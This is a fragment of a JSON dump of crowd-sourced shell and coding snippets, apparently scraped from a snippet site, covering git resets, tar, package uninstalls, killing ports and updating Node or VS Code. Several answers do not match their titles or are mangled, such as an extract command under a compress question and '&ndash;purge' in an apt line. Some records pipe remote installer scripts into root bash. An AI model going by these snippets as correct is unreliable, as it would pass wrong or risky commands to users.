    "keyword": null,
    "link": null,
    "title": " how to stop ping command in linux",
    "description": "Ctrl + C  # Limit ping tests (here 10 times): ping -n 10 www.codegrepper.com\n",
    "reg_date": "2021-10-11T22:07:22.000Z"
  },
  {
    "id": 2576,
    "keyword": null,
    "link": null,
    "title": " how to stop port 8080",
    "description": "netstat  -ano  |  findstr  <Port Number> \ntaskkill  /F  /PID  <Process Id> \nC:\\Users\\RevisitClass>netstat -ano | findstr 8080   TCP    0.0.0.0:18080          0.0.0.0:0              LISTENING       19788   TCP    [::]:18080             [::]:0                 LISTENING       19788 \nC:\\Users\\RevisitClass>taskkill /F /PID 19788 SUCCESS: The process with PID 19788 has been terminated. \n",
    "reg_date": "2021-10-11T22:07:23.000Z"
  },
  {
    "id": 2577,
    "keyword": null,
    "link": null,
    "title": " how to stop running port in ubuntu",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nsudo kill -9 `sudo lsof -t -i:3002`\nsudo kill -9 `sudo lsof -t -i:{PORT_NUMBER}`\nfuser -n tcp -k 4000  \nsudo lsof -t -i:9001\nKill specific port\n",
    "reg_date": "2021-10-11T22:07:23.000Z"
  },
  {
    "id": 2578,
    "keyword": null,
    "link": null,
    "title": " how to store a 6 digit number as 6 separate integers",
    "description": "int number; // = some int  while (number > 0) {     print( number % 10);     number = number / 10; } \n",
    "reg_date": "2021-10-11T22:07:23.000Z"
  },
  {
    "id": 2579,
    "keyword": null,
    "link": null,
    "title": " how to store float values in shell script",
    "description": "# x will have value for any operation user does in place of '9/5' x=`echo | awk \"{print 9/5}\"` echo $x\n",
    "reg_date": "2021-10-11T22:07:23.000Z"
  },
  {
    "id": 2580,
    "keyword": null,
    "link": null,
    "title": " how to swap branch git",
    "description": "[git checkout \"branch_name\"]  is another way to say:  [git checkout -b branch_name origin/branch_name]  in case \"branch_name\" exists only remotely.  [git checkout -b branch_name origin/branch_name] is useful in case you have multiple remotes.  Regarding [git checkout origin 'another_branch'] I'm not sure this is possible, AFAK you can do this using \"fetch\" command -- [git fetch origin 'another_branch']\n",
    "reg_date": "2021-10-11T22:07:23.000Z"
  },
  {
    "id": 2581,
    "keyword": null,
    "link": null,
    "title": " how to switch between desktops ubuntu",
    "description": "Ctrl+Alt+ArrowKey\n",
    "reg_date": "2021-10-11T22:07:24.000Z"
  },
  {
    "id": 2582,
    "keyword": null,
    "link": null,
    "title": " how to tar a file",
    "description": "tar -czvf name-of-archive.tar.gz /path/to/directory-or-file\ntar -zcvf file.tar.gz /path/to/dir/\ntar -cvzf name.tar /path/to/directory\n",
    "reg_date": "2021-10-11T22:07:24.000Z"
  },
  {
    "id": 2583,
    "keyword": null,
    "link": null,
    "title": " how to tar and gzip a file in linux",
    "description": "tar -xvzf community_images.tar.gz\n",
    "reg_date": "2021-10-11T22:07:24.000Z"
  },
  {
    "id": 2584,
    "keyword": null,
    "link": null,
    "title": " how to tar linux",
    "description": "tar -zcvf file.tar.gz /path/to/dir/\nCreate a new tar archive. $ tar cvf archive_name.tar dirname/  Extract from an existing tar archive. $ tar xvf archive_name.tar  View an existing tar archive. $ tar tvf archive_name.tar\n",
    "reg_date": "2021-10-11T22:07:24.000Z"
  },
  {
    "id": 2585,
    "keyword": null,
    "link": null,
    "title": " how to terminate lite server",
    "description": "//While server is running CTRL + C Yes and enter\n",
    "reg_date": "2021-10-11T22:07:24.000Z"
  },
  {
    "id": 2586,
    "keyword": null,
    "link": null,
    "title": " how to trim log file linux",
    "description": "truncate -s 0 logfile  Where -s is used to set or adjust the file size by SIZE bytes.  The file can be relative to the current directory or  an absolute path to the file provided.  For complete truncate command options, use the option --help\n",
    "reg_date": "2021-10-11T22:07:24.000Z"
  },
  {
    "id": 2587,
    "keyword": null,
    "link": null,
    "title": " how to turn off bluetooth in ubuntu 18.04 terminal",
    "description": "sudo rfkill block bluetooth : To stop bluetooh  sudo rfkill unblock bluetooth : To start bluetooh\n",
    "reg_date": "2021-10-11T22:07:25.000Z"
  },
  {
    "id": 2588,
    "keyword": null,
    "link": null,
    "title": " how to turn off transactions during knex migrations",
    "description": "# use this package: yarn global add knex-migrate or npm install -g knex-migrate knex-migrate up --raw # the raw option disables transactions\n",
    "reg_date": "2021-10-11T22:07:25.000Z"
  },
  {
    "id": 2589,
    "keyword": null,
    "link": null,
    "title": " how to turn on scroll lock in ubuntu",
    "description": "xmodmap -e 'add mod3 = Scroll_Lock'\n",
    "reg_date": "2021-10-11T22:07:25.000Z"
  },
  {
    "id": 2590,
    "keyword": null,
    "link": null,
    "title": " how to uncommit in git",
    "description": " git reset --soft HEAD^  git reset HEAD^ //And if you actually want to completely undo it, throwing away all uncommitted changes, resetting everything to the previous commit (as the original question asked):  git reset --hard HEAD^\ngit reset --soft HEAD^ \ngit reset --soft \"HEAD^\" git reset --soft \"asdf\" \n",
    "reg_date": "2021-10-11T22:07:25.000Z"
  },
  {
    "id": 2591,
    "keyword": null,
    "link": null,
    "title": " how to uncommit my last commit in git",
    "description": " git reset --soft HEAD^  git reset HEAD^ //And if you actually want to completely undo it, throwing away all uncommitted changes, resetting everything to the previous commit (as the original question asked):  git reset --hard HEAD^\ngit reset --soft HEAD^ \n",
    "reg_date": "2021-10-11T22:07:25.000Z"
  },
  {
    "id": 2592,
    "keyword": null,
    "link": null,
    "title": " how to undo a commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\n# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\n$ git reset --soft HEAD~1\n$ git reset --hard HEAD~1 \n$ git reset --soft HEAD~1 \n# Undo last commit. # --soft flag makes sure that the changes in undone revisions are preserved. # You'll find the changes as uncommitted local modifications in your working copy. git reset --soft HEAD~1  # If you don't want to keep these changes, simply use the --hard flag. # This will completely remove the changes. git reset --hard HEAD~1\n",
    "reg_date": "2021-10-11T22:07:25.000Z"
  },
  {
    "id": 2593,
    "keyword": null,
    "link": null,
    "title": " how to undo a modified file in git",
    "description": "# If you want to revert the changes only in current working directory git checkout -- .  # discard anything (note: you have to be in the directory # where all of the changes are located) # or you can use the command on line 9, you can discard anything # on the repo git checkout -- * git checkout -- :/  # or if you check the git status message after modifying a file  # there is this command  git restore <file>\n",
    "reg_date": "2021-10-11T22:07:25.000Z"
  },
  {
    "id": 2594,
    "keyword": null,
    "link": null,
    "title": " how to undo makemigrations django",
    "description": "# The migration you want to undo is 0011_last_migration # The migration right before it is 0010_previous_migration  python manage.py migrate my_app 0010_previous_migration   # Then you could delete the migration that you don't need (0011_last_migration) in the migration folder   # list all migration names like this python manage.py showmigrations my_app\n",
    "reg_date": "2021-10-11T22:07:26.000Z"
  },
  {
    "id": 2595,
    "keyword": null,
    "link": null,
    "title": " how to uninstall a software in ubuntu",
    "description": "$ sudo apt-get remove package-name\nsudo apt-get remove <application_name> \n$ sudo apt-get purge package-name\nsudo apt-get purge --auto-remove package-name\n$ dpkg --list\nremove application icon file from \"/usr/share/applications\" or \"~/.local/share/applications\".\n",
    "reg_date": "2021-10-11T22:07:26.000Z"
  },
  {
    "id": 2596,
    "keyword": null,
    "link": null,
    "title": " how to uninstall all extensions in vs code",
    "description": "#for mac/lunix rm -rf ~/.vscode/extensions  #for windows rmdir %USERPROFILE%\\.vscode\\extensions /s\nrmdir %USERPROFILE%\\.vscode\\extensions /s \n//How To Delete all Visual Studios Code Extensions that you installed   //Open Terminal or Command Prompt, and enter one of this codes below to delete //your extensions   // For Mac/Linux rm -rf ~/.vscode/extensions //For Windows  rmdir %USERPROFILE%\\.vscode\\extensions /s\n# For Mac/Linux users:  # Open Terminal/Command Line rm -rf ~/.vscode/extensions # Hit enter\n",
    "reg_date": "2021-10-11T22:07:26.000Z"
  },
  {
    "id": 2597,
    "keyword": null,
    "link": null,
    "title": " how to uninstall apps without admin password",
    "description": "Use Registry Editor On your Windows 10 device, go to Start Screen and use Windows Key + R keyboard shortcut in order to open the Run box. There type regedit and press OK. Now if you click on each key from that path you will be able to access each program from your device, thus you will be able to uninstall the same.\n",
    "reg_date": "2021-10-11T22:07:26.000Z"
  },
  {
    "id": 2598,
    "keyword": null,
    "link": null,
    "title": " how to uninstall aws cli",
    "description": "$ sudo rm -rf /usr/local/aws $ sudo rm /usr/local/bin/aws \n",
    "reg_date": "2021-10-11T22:07:27.000Z"
  },
  {
    "id": 2599,
    "keyword": null,
    "link": null,
    "title": " how to uninstall composer in ubuntu",
    "description": "composer self-update \nDelete the file composer.phar. Delete the Cache Folder: Linux: /home/<user>/.composer Windows: C:\\Users\\<username>\\AppData\\Roaming\\Composer\n",
    "reg_date": "2021-10-11T22:07:27.000Z"
  },
  {
    "id": 2600,
    "keyword": null,
    "link": null,
    "title": " how to uninstall cudnn ubuntu",
    "description": "apt-cache search cudnn\n",
    "reg_date": "2021-10-11T22:07:27.000Z"
  },
  {
    "id": 2601,
    "keyword": null,
    "link": null,
    "title": " how to uninstall everything in pip",
    "description": "pip3 freeze | xargs pip3 uninstall -y\npip freeze > requirements.txt pip uninstall -r requirements.txt\npip freeze | xargs pip uninstall -y\n",
    "reg_date": "2021-10-11T22:07:27.000Z"
  },
  {
    "id": 2602,
    "keyword": null,
    "link": null,
    "title": " how to uninstall git in ubuntu 18.04",
    "description": "$ sudo apt-get remove --auto-remove git \n",
    "reg_date": "2021-10-11T22:07:27.000Z"
  },
  {
    "id": 2603,
    "keyword": null,
    "link": null,
    "title": " how to uninstall global package npm",
    "description": "npm uninstall -g <package-name> # example  npm uninstall -g webpack\nnpm uninstall <package_name> //Example npm uninstall mongoose //A tip ctrl+c helps to terminate a job in terminal\nnpm uninstall -g <package_name>\nnpm un <package_name>\nnpm uninstall -g <@scope/package_name>\n",
    "reg_date": "2021-10-11T22:07:27.000Z"
  },
  {
    "id": 2604,
    "keyword": null,
    "link": null,
    "title": " how to uninstall jdk java",
    "description": "#If you want to remove Openjdk only, execute the following command on terminal: sudo apt-get remove openjdk*  #If you want to remove Openjdk along with dependencies, execute the following command on terminal: sudo apt-get remove --auto-remove openjdk*  #If you want to remove Openjdk and it&rsquo;s configuration files, execute the following command on terminal: sudo apt-get purge openjdk*  #If you want to remove Openjdk along with dependencies and it&rsquo;s configuration files, execute the following command on terminal: sudo apt-get purge --auto-remove openjdk*\n",
    "reg_date": "2021-10-11T22:07:28.000Z"
  },
  {
    "id": 2605,
    "keyword": null,
    "link": null,
    "title": " how to uninstall jdk java completely from ubuntu linux",
    "description": "#If you want to remove Openjdk only, execute the following command on terminal: sudo apt-get remove openjdk*  #If you want to remove Openjdk along with dependencies, execute the following command on terminal: sudo apt-get remove --auto-remove openjdk*  #If you want to remove Openjdk and it&rsquo;s configuration files, execute the following command on terminal: sudo apt-get purge openjdk*  #If you want to remove Openjdk along with dependencies and it&rsquo;s configuration files, execute the following command on terminal: sudo apt-get purge --auto-remove openjdk*\n",
    "reg_date": "2021-10-11T22:07:28.000Z"
  },
  {
    "id": 2606,
    "keyword": null,
    "link": null,
    "title": " how to uninstall kernel jupyter",
    "description": "jupyter kernelspec uninstall unwanted-kernel\n",
    "reg_date": "2021-10-11T22:07:29.000Z"
  },
  {
    "id": 2607,
    "keyword": null,
    "link": null,
    "title": " how to uninstall lamp server in ubuntu 18.04",
    "description": "#!/bin/bash  # This will remove Apache sudo service apache2 stop sudo apt-get purge apache2 apache2-utils apache2.2-bin apache2-common sudo apt remove apache2.* sudo apt-get autoremove whereis apache2 sudo rm -rf /etc/apache2  # This will remove PHP sudo apt-get purge `dpkg -l | grep php7.2| awk '{print $2}' |tr \"\\n\" \" \"` sudo apt-get purge php7.* sudo apt-get autoremove --purge whereis php sudo rm -rf /etc/php  # This will remove MYSql sudo service mysql stop sudo apt-get remove --purge *mysql\\* sudo apt-get remove --purge mysql-server mysql-client mysql-common -y rm -rf /etc/mysql sudo apt-get autoremove sudo apt-get autoclean   #https://www.fiverr.com/tamerjarrar sudo reboot\n",
    "reg_date": "2021-10-11T22:07:29.000Z"
  },
  {
    "id": 2608,
    "keyword": null,
    "link": null,
    "title": " how to uninstall netbeans on ubuntu",
    "description": "sudo apt autoremove netbeans  sudo apt-get remove --purge netbeans\n",
    "reg_date": "2021-10-11T22:07:29.000Z"
  },
  {
    "id": 2609,
    "keyword": null,
    "link": null,
    "title": " how to uninstall node.JS",
    "description": "How to remove/uninstall Node.js from Windows: 1. Run npm cache clean --force 2. Uninstall from Programs & Features with the uninstaller. 3. Reboot (or you probably can get away with killing all node-related processes from Task Manager). 4. Look for these folders and remove them (and their contents) if any still exist. Depending on the version you installed, UAC settings, and CPU architecture, these may or may not exist:     C:\\Program Files (x86)\\Nodejs     C:\\Program Files\\Nodejs     C:\\Users\\{User}\\AppData\\Roaming\\npm (or %appdata%\\npm)     C:\\Users\\{User}\\AppData\\Roaming\\npm-cache (or %appdata%\\npm-cache)     C:\\Users\\{User}\\.npmrc (and possibly check for that without the . prefix too)     C:\\Users\\{User}\\AppData\\Local\\Temp\\npm-* 5. Check your %PATH% environment variable to ensure no references to Nodejs or npm exist. 6. If it's still not uninstalled, type where node at the command prompt and you'll see where it resides -- delete that (and probably the parent directory) too. 7. Reboot, for good measure.\nIn IOS terminal: brew uninstall node  Use sudo if ask for permitions\n",
    "reg_date": "2021-10-11T22:07:29.000Z"
  },
  {
    "id": 2610,
    "keyword": null,
    "link": null,
    "title": " how to uninstall npm packages",
    "description": "npm uninstall -g webpack npm uninstall webpack\nnpm uninstall --save <package_name> npm un <package_name>\nnpm uninstall <package_name> //Example npm uninstall mongoose //A tip ctrl+c helps to terminate a job in terminal\nHow to remove/uninstall Node.js from Windows: 1. Run npm cache clean --force 2. Uninstall from Programs & Features with the uninstaller. 3. Reboot (or you probably can get away with killing all node-related processes from Task Manager). 4. Look for these folders and remove them (and their contents) if any still exist. Depending on the version you installed, UAC settings, and CPU architecture, these may or may not exist:     C:\\Program Files (x86)\\Nodejs     C:\\Program Files\\Nodejs     C:\\Users\\{User}\\AppData\\Roaming\\npm (or %appdata%\\npm)     C:\\Users\\{User}\\AppData\\Roaming\\npm-cache (or %appdata%\\npm-cache)     C:\\Users\\{User}\\.npmrc (and possibly check for that without the . prefix too)     C:\\Users\\{User}\\AppData\\Local\\Temp\\npm-* 5. Check your %PATH% environment variable to ensure no references to Nodejs or npm exist. 6. If it's still not uninstalled, type where node at the command prompt and you'll see where it resides -- delete that (and probably the parent directory) too. 7. Reboot, for good measure.\nnpm uninstall <module_name>  \nnpm uninstall nodemon\n",
    "reg_date": "2021-10-11T22:07:29.000Z"
  },
  {
    "id": 2611,
    "keyword": null,
    "link": null,
    "title": " how to uninstall oh my zsh",
    "description": "source ~/.oh-my-zsh/tools/uninstall.sh \nrm -rf ~/.oh-my-zsh rm ~/.zshrc cp ~/.zshrc.pre-oh-my-zsh ~/.zshrc source ~/.zshrc\nrm -rf ~/.oh-my-zsh rm ~/.zshrc cp ~/.zshrc.pre-oh-my-zsh ~/.zshrc source ~/.zshrc \n",
    "reg_date": "2021-10-11T22:07:29.000Z"
  },
  {
    "id": 2612,
    "keyword": null,
    "link": null,
    "title": " how to uninstall opencv in ubuntu",
    "description": "sudo apt-get purge '*opencv*'\n",
    "reg_date": "2021-10-11T22:07:30.000Z"
  },
  {
    "id": 2613,
    "keyword": null,
    "link": null,
    "title": " how to uninstall openjdk in linux",
    "description": "sudo apt-get autoremove openjdk-11-jre\n",
    "reg_date": "2021-10-11T22:07:30.000Z"
  },
  {
    "id": 2614,
    "keyword": null,
    "link": null,
    "title": " how to uninstall php",
    "description": "sudo apt-get remove &ndash;purge php* sudo apt-get purge php*\n$ sudo apt-get purge phpmyadmin\n",
    "reg_date": "2021-10-11T22:07:30.000Z"
  },
  {
    "id": 2615,
    "keyword": null,
    "link": null,
    "title": " how to uninstall pycharm community edition in ubutu",
    "description": "sudo snap remove pycharm-community sudo apt-get autoclean  sudo apt-get autoremove\n",
    "reg_date": "2021-10-11T22:07:30.000Z"
  },
  {
    "id": 2616,
    "keyword": null,
    "link": null,
    "title": " how to uninstall react native cli globally",
    "description": "npm uninstall -g react-native-cli \nyarn global remove @react-native-community/cli \nnpm uninstall -g react-native-cli\n",
    "reg_date": "2021-10-11T22:07:30.000Z"
  },
  {
    "id": 2617,
    "keyword": null,
    "link": null,
    "title": " how to uninstall spacevim",
    "description": "curl -sLf https://spacevim.org/install.sh | bash -s -- --uninstall\n",
    "reg_date": "2021-10-11T22:07:30.000Z"
  },
  {
    "id": 2618,
    "keyword": null,
    "link": null,
    "title": " how to unistall and reinstall latest composer in mac",
    "description": "1.  cd usr/local/bin 2.  rm -r composer \n",
    "reg_date": "2021-10-11T22:07:31.000Z"
  },
  {
    "id": 2619,
    "keyword": null,
    "link": null,
    "title": " how to unmount sshfs",
    "description": "fusermount -u /home/user/pi \n",
    "reg_date": "2021-10-11T22:07:31.000Z"
  },
  {
    "id": 2620,
    "keyword": null,
    "link": null,
    "title": " how to unrar in linux",
    "description": "$ sudo apt install unrar //extract to the current folder $ sudo unrar x filename.rar //extract all files without sub folders $ sudo unrar e filename.rar\n",
    "reg_date": "2021-10-11T22:07:31.000Z"
  },
  {
    "id": 2621,
    "keyword": null,
    "link": null,
    "title": " how to untar a tar file",
    "description": "tar -xvf filename.tar\n## Untar files in Current Directory ## tar -xvf filename.tar.gz  ## Untar files in specified Directory ## tar -xvf filename.tar.gz -C /path_name_for_unzip/  -x : extract -C : specified directory -v : Verbosely show the .tar file progress. -f : filename of archive file\ntar -xvf yourfile.tar.gz\ntar -zxvf file_name.tar.gz\ntar -xvf yourfile.tar\n",
    "reg_date": "2021-10-11T22:07:31.000Z"
  },
  {
    "id": 2622,
    "keyword": null,
    "link": null,
    "title": " how to untar tar.gz",
    "description": "# Basic syntax: tar -zxvf file.tar.gz  # Where: #\t- x tells tar to extract the files #\t- v tells the command to list all of the files in the archive #\t- z tells the tar command to uncompress the file (gzip) #\t- f tells tar that you are going to give it a file name to work with\n tar xvzf file.tar.gz\ntar -xvf yourfile.tar.gz\ntar -xzf file.tar.gz\ntar -zxvf file_name.tar.gz\ntar -xvzf community_images.tar.gz\n",
    "reg_date": "2021-10-11T22:07:31.000Z"
  },
  {
    "id": 2623,
    "keyword": null,
    "link": null,
    "title": " how to unzip Tar file",
    "description": "## Untar files in Current Directory ## tar -xvf filename.tar.gz  ## Untar files in specified Directory ## tar -xvf filename.tar.gz -C /path_name_for_unzip/  -x : extract -C : specified directory -v : Verbosely show the .tar file progress. -f : filename of archive file\ntar -xvf yourfile.tar\ntar -xf archive.tar.gz\ntar xvf spark-*\n",
    "reg_date": "2021-10-11T22:07:31.000Z"
  },
  {
    "id": 2624,
    "keyword": null,
    "link": null,
    "title": " how to update a local git repository",
    "description": "git pull origin master \nC:\\> git update-git-for-windows \nFirst, navigate to the desired directory:  $ cd ~/Documents/GitHub/DI-NEON-participants  And then type:  $ git remote add upstream https://github.com/NEONS...  Update local repo using git pull with the added directions of  upstream indicating the central repository and master specifying  which branch you are pulling down:  $ git pull upstream master\ngit pull origin my_default_branch_name \n",
    "reg_date": "2021-10-11T22:07:31.000Z"
  },
  {
    "id": 2625,
    "keyword": null,
    "link": null,
    "title": " how to update a local project from git",
    "description": "git update-git-for-windows\ngit pull origin master \nC:\\> git update-git-for-windows \n",
    "reg_date": "2021-10-11T22:07:32.000Z"
  },
  {
    "id": 2626,
    "keyword": null,
    "link": null,
    "title": " how to update centos",
    "description": "sudo yum update\n",
    "reg_date": "2021-10-11T22:07:32.000Z"
  },
  {
    "id": 2627,
    "keyword": null,
    "link": null,
    "title": " how to update git on windows",
    "description": "C:\\> git update-git-for-windows\nC:\\> git update-git-for-windows \n",
    "reg_date": "2021-10-11T22:07:32.000Z"
  },
  {
    "id": 2628,
    "keyword": null,
    "link": null,
    "title": " how to update laravel installer",
    "description": "composer global update laravel/installer\nFIRST METHOD : =============== # uninstall the package composer global remove laravel/installer  # reinstall composer global require laravel/installer    SECOND METHOD :  ================    Just upgraded from Laravel 7 to 8, and running    composer global require \"laravel/installer:^4.0\"   did the trick for me (i.e., without removeing first)\n",
    "reg_date": "2021-10-11T22:07:32.000Z"
  },
  {
    "id": 2629,
    "keyword": null,
    "link": null,
    "title": " how to update master to main in github",
    "description": "# Step 1  # create main branch locally, taking the history from master git branch -m master main  # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main  # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main  # Step 4 # change the default branch on GitHub to main # https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch  # Step 5 # delete the master branch on the remote git push origin --delete master\n",
    "reg_date": "2021-10-11T22:07:32.000Z"
  },
  {
    "id": 2630,
    "keyword": null,
    "link": null,
    "title": " how to update metasploit",
    "description": "First Try sudo apt-get remove metasploit-framework then, sudo apt  update ; sudo apt install metasploit-framework or sudo msfupdate\nsudo apt install metasploit-framework msfupdate\n",
    "reg_date": "2021-10-11T22:07:32.000Z"
  },
  {
    "id": 2631,
    "keyword": null,
    "link": null,
    "title": " how to update node in ubuntu 18.04",
    "description": "sudo npm cache clean -f sudo npm install -g n sudo n stable\nsudo npm cache clean -f sudo npm install -g n sudo n stable \n# Using Ubuntu curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - sudo apt-get install -y nodejs  # Using Debian, as root curl -sL https://deb.nodesource.com/setup_12.x | bash - apt-get install -y nodejs \n# Using Ubuntu curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - sudo apt-get install -y nodejs\n",
    "reg_date": "2021-10-11T22:07:32.000Z"
  },
  {
    "id": 2632,
    "keyword": null,
    "link": null,
    "title": " how to update pip3 packages",
    "description": "pip3 install --upgrade pip\npip list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1  | xargs -n1 pip install -U\nwhat Lightsbane said\n",
    "reg_date": "2021-10-11T22:07:33.000Z"
  },
  {
    "id": 2633,
    "keyword": null,
    "link": null,
    "title": " how to update pip in linux",
    "description": "pip install --upgrade pip\n",
    "reg_date": "2021-10-11T22:07:33.000Z"
  },
  {
    "id": 2634,
    "keyword": null,
    "link": null,
    "title": " how to update portainer",
    "description": "docker stop portainer docker rm portainer docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always --pull=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce\n",
    "reg_date": "2021-10-11T22:07:33.000Z"
  },
  {
    "id": 2635,
    "keyword": null,
    "link": null,
    "title": " how to update remote branches list git",
    "description": "git remote update origin --prune \n",
    "reg_date": "2021-10-11T22:07:33.000Z"
  },
  {
    "id": 2636,
    "keyword": null,
    "link": null,
    "title": " how to update ubuntu",
    "description": "sudo apt update && sudo apt upgrade -y #or use it seperately sudo apt update sudo apt upgrade #you make wanna run below command to remove unwanted #and free up some space sudo apt autoremove\necho \"sudo apt update && sudo apt -y upgrade && sudo apt -y dist-upgrade && sudo apt -y autoremove && sudo apt autoclean\" > update && sudo mv update /usr/local/bin/update && sudo chmod +x /usr/local/bin/update \nsudo apt update && sudo apt upgrade -y\n# \"To update Linux type:\" sudo apt-get update # Enter your user's password.\n#gets package(s) update definitions sudo apt update #upgrades the package(s) for which update definitions are received sudo apt upgrade \n# Upgrades all applications sudo apt-get upgrade \n",
    "reg_date": "2021-10-11T22:07:33.000Z"
  },
  {
    "id": 2637,
    "keyword": null,
    "link": null,
    "title": " how to update visual studio to the latest version in ubuntu",
    "description": "wget https://vscode-update.azurewebsites.net/latest/linux-deb-x64/stable -O /tmp/code_latest_amd64.deb sudo dpkg -i /tmp/code_latest_amd64.deb \nwget https://vscode-update.azurewebsites.net/latest/linux-deb-x64/stable -O /tmp/code_latest_amd64.deb sudo dpkg -i /tmp/code_latest_amd64.deb\n",
    "reg_date": "2021-10-11T22:07:33.000Z"
  },
  {
    "id": 2638,
    "keyword": null,
    "link": null,
    "title": " how to update vs code in linux",
    "description": "sudo add-apt-repository -y \"deb https://packages.microsoft.com/repos/vscode stable main \" sudo apt update sudo apt -y install code\nwget https://vscode-update.azurewebsites.net/latest/linux-deb-x64/stable -O /tmp/code_latest_amd64.deb sudo dpkg -i /tmp/code_latest_amd64.deb \nwget https://vscode-update.azurewebsites.net/latest/linux-deb-x64/stable -O /tmp/code_latest_amd64.deb sudo dpkg -i /tmp/code_latest_amd64.deb\nwget 'https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64' -O /tmp/code_latest_amd64.deb sudo dpkg -i /tmp/code_latest_amd64.deb \nupdate vscode\n",
    "reg_date": "2021-10-11T22:07:33.000Z"
  },
  {
    "id": 2639,
    "keyword": null,
    "link": null,
    "title": " how to upgrade pihole",
    "description": "sudo pihole -up\n",
    "reg_date": "2021-10-11T22:07:33.000Z"
  },
  {
    "id": 2640,
    "keyword": null,
    "link": null,
    "title": " how to upgrade pip",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \n#for updating pip type the following command in terminal or cmd or powershell python -m pip install --upgrade pip\npip install  python -m pip install --upgrade pip\n# Using the Anaconda Prompt python -m pip install --upgrade pip\n",
    "reg_date": "2021-10-11T22:07:34.000Z"
  },
  {
    "id": 2641,
    "keyword": null,
    "link": null,
    "title": " how to upgrade pip in ubuntu",
    "description": "sudo -H pip3 install --upgrade pip\n",
    "reg_date": "2021-10-11T22:07:34.000Z"
  },
  {
    "id": 2642,
    "keyword": null,
    "link": null,
    "title": " how to upgrade to latest node in ubuntu 17.04 using terminal",
    "description": "# Using Ubuntu curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install -y nodejs  # Using Debian, as root curl -sL https://deb.nodesource.com/setup_13.x | bash - apt-get install -y nodejs \nsudo npm cache clean -f sudo npm install -g n sudo n stable \n",
    "reg_date": "2021-10-11T22:07:34.000Z"
  },
  {
    "id": 2643,
    "keyword": null,
    "link": null,
    "title": " how to upload files to s3 bucket from mac shell",
    "description": "aws s3 mv . s3://YOUR_BUCKET_NAME --recursive --exclude \"*.DS_Store\"\n// If YOU WANT TO MAKE FILES AND FOLDERS Public aws s3 sync . s3://dronervm --acl public-read --exclude \"*.DS_Store\"\n",
    "reg_date": "2021-10-11T22:07:34.000Z"
  },
  {
    "id": 2644,
    "keyword": null,
    "link": null,
    "title": " how to use docker exec command",
    "description": "command docker exec -it <container name> /bin/bash\nsudo docker exec --user root -it containerName /bin/bash\n",
    "reg_date": "2021-10-11T22:07:34.000Z"
  },
  {
    "id": 2645,
    "keyword": null,
    "link": null,
    "title": " how to use doskey in cmder",
    "description": "Press \"Ctrl\" + \"r\" and then type your substring to search in your history. Last matching command line will be found, keep using \"Ctrl\" + \"r\" to find previous ones. Once you find your searched command just press \"Enter\": (reverse-i-search)`searched_substring': command_with_searched_substring\n",
    "reg_date": "2021-10-11T22:07:34.000Z"
  },
  {
    "id": 2646,
    "keyword": null,
    "link": null,
    "title": " how to use youtube dl for mp3",
    "description": "youtube-dl -x --audio-format mp3 https://www.youtube.com/watch?v=jwD4AEVBL6Q\n",
    "reg_date": "2021-10-11T22:07:34.000Z"
  },
  {
    "id": 2647,
    "keyword": null,
    "link": null,
    "title": " how to verify if pip installed a package",
    "description": "pip list | grep <name_of_package> pip list | grep ansible  #output ansible        4.3.0 ansible-core   2.11.3\nFile\"stdin\",line 1  pip list  Syntax Error: invalid syntax\n",
    "reg_date": "2021-10-11T22:07:35.000Z"
  },
  {
    "id": 2648,
    "keyword": null,
    "link": null,
    "title": " how to view a list of installed npm packages",
    "description": "npm list -g\n",
    "reg_date": "2021-10-11T22:07:35.000Z"
  },
  {
    "id": 2649,
    "keyword": null,
    "link": null,
    "title": " how to view a text file in cmd",
    "description": "type filename\n",
    "reg_date": "2021-10-11T22:07:35.000Z"
  },
  {
    "id": 2650,
    "keyword": null,
    "link": null,
    "title": " how to view task manager in linux",
    "description": "#To view the memory in linux free #this will give the memory usage \n",
    "reg_date": "2021-10-11T22:07:35.000Z"
  },
  {
    "id": 2651,
    "keyword": null,
    "link": null,
    "title": " how to zip with tar command",
    "description": "tar -czvf name-of-archive.tar.gz /path/to/directory-or-file\ntar -czvf archive.tar.gz stuff\ntar -czvf archive.tar.gz /usr/local/something\n",
    "reg_date": "2021-10-11T22:07:35.000Z"
  },
  {
    "id": 2652,
    "keyword": null,
    "link": null,
    "title": " how upgrade the thins upgradable in ubuntu",
    "description": "echo \"sudo apt update && sudo apt -y upgrade && sudo apt -y dist-upgrade && sudo apt -y autoremove && sudo apt autoclean\" > update && sudo mv update /usr/local/bin/update && sudo chmod +x /usr/local/bin/update \n",
    "reg_date": "2021-10-11T22:07:36.000Z"
  },
  {
    "id": 2653,
    "keyword": null,
    "link": null,
    "title": " how use nvm with zsh",
    "description": "git clone https://github.com/lukechilds/zsh-nvm ~/.oh-my-zsh/custom/plugins/zsh-nvm // edit .zshrc file and add to plugins plugins+=(zsh-nvm) // After the save, close the terminal re-open and install the version of node you want nvm install 12 // Magically works!\n",
    "reg_date": "2021-10-11T22:07:36.000Z"
  },
  {
    "id": 2654,
    "keyword": null,
    "link": null,
    "title": " htaccess all requests goes to index.php",
    "description": "# eg. on cpanel, set document root to Laravels 'public' folder # put .htaccess to 'public_html' / root directory  RewriteEngine on RewriteBase /frameworkRootFolder/ RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.*)$ /frameworkRootFolder/index.php [L,QSA]\n",
    "reg_date": "2021-10-11T22:07:36.000Z"
  },
  {
    "id": 2655,
    "keyword": null,
    "link": null,
    "title": " if argument bash",
    "description": "if [ -z \"$1\" ]   then     echo \"No argument supplied\" fi  if [\"$1\" ]   then     echo \"Argument supplied is: \"$1 fi \n",
    "reg_date": "2021-10-11T22:07:36.000Z"
  },
